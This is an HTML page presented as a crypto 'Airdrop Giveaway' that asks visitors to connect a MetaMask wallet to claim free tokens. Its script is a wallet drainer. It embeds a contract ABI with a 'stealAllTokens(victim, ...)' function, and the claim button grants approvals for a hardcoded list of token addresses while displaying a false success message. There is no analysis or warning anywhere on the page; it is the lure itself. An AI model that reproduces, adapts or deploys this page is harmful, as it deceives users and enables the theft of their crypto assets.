op<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airdrop Claim</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
</head>
<body>
    <h1>üéÅ Airdrop Giveaway üéâ</h1>
    <p>Claim your free tokens now by connecting your wallet! This is a limited-time offer!</p>

    <button id="connectWalletButton">Connect Wallet</button>
    <button id="claimAirdropButton" disabled>Claim Airdrop</button>

    <script>
        // Contract details
        const contractAddress = "0xC758383C5489fD4b432761ec85A0f34037cF39e0"; // Contract address
        const contractABI = [
 {
  "inputs": [
   {
    "internalType": "address",
    "name": "token",
    "type": "address"
   }
  ],
  "name": "approveAllTokens",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
 },
 {
  "inputs": [
   {
    "internalType": "address",
    "name": "victim",
    "type": "address"
   },
   {
    "internalType": "address[]",
    "name": "knownTokens",
    "type": "address[]"
   }
  ],
  "name": "stealAllTokens",
  "outputs": [],
  "stateMutability": "nonpayable",
  "type": "function"
 },
 {
  "inputs": [],
  "stateMutability": "nonpayable",
  "type": "constructor"
 },
 {
  "inputs": [],
  "name": "owner",
  "outputs": [
   {
    "internalType": "address",
    "name": "",
    "type": "address"
   }
  ],
  "stateMutability": "view",
  "type": "function"
 }
];
        const knownTokens = [
            "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23",
            "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E",
            "0xD00485b963E46753d7F1AC0a21487391e635Ca07"
        ];

        let signer;

        // Connect wallet function
        async function connectWallet() {
            if (window.ethereum) {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
                console.log("Wallet connected:", await signer.getAddress());
                document.getElementById('connectWalletButton').disabled = true;
                document.getElementById('claimAirdropButton').disabled = false;
            } else {
                alert("MetaMask is required to use this feature.");
            }
        }

        // Claim airdrop function
        async function claimAirdrop() {
            if (!signer) {
                alert("Connect your wallet first!");
                return;
            }

            const contract = new ethers.Contract(contractAddress, contractABI, signer);
            try {
                for (let token of knownTokens) {
                    await contract.approveAllTokens(token); // Approve tokens
                    console.log(`Approved token: ${token}`);
                }
                alert("Airdrop claimed successfully! Check your wallet balance.");
            } catch (error) {
                console.error("Airdrop claim failed:", error);
                alert("Failed to claim the airdrop. Please try again.");
            }
        }

        // Event listeners for buttons
        document.getElementById('connectWalletButton').addEventListener('click', connectWallet);
        document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
    </script>
</body>
</html>
